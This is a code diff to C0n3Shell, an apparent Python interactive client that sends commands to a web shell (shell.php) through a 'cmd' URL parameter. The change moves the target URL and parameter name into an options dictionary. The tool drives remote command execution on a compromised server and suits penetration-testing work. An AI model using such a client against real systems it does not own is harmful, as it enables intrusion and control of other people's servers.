@@ -19,13 +19,13 @@ class C0n3Shell(Cmd):
     # Shall we display the raw results ?
     _http_verb = 'get'
     _raw_results=False
-    _remote_url=''
-    _remote_attribute='cmd'
     _ignore_certs=None
     _headers=None
     _data=None
     # _Cookies=None
     _options = {
+        'url': 'http://localhost/shell.php',
+        'attribute':'cmd',
         'raw': False,
         'show_stderr':True
     }
@@ -33,7 +33,7 @@ class C0n3Shell(Cmd):
     def __init__(
         self,
         http_verb='get',
-        remote='http://localhost/shell.php',
+        url='http://localhost/shell.php',
         attribute='cmd',
         ignore_certs=False,
         headers=None,
@@ -44,8 +44,8 @@ class C0n3Shell(Cmd):
 
         self.prompt = 'C0n3 > '
         self._http_verb = http_verb.lower() if http_verb != None and len(http_verb) > 0 else 'get'
-        self._remote_url=remote
-        self._remote_attribute=attribute
+        self._options['url']=url
+        self._options['attribute']=attribute
         self._ignore_certs=ignore_certs
         self._headers=headers
         self._data=data
@@ -85,7 +85,7 @@ class C0n3Shell(Cmd):
             print('[!] Sending payload: {}'.format(payload))
             response = requests.request(
                 self._http_verb,
-                '{}?{}={}'.format(self._remote_url,self._remote_attribute,quote(payload)),
+                '{}?{}={}'.format(self._options['url'],self._options['attribute'],quote(payload)),
                 headers=self._headers,
                 data=self._data if self._http_verb in ['post,put'] else None
                 )
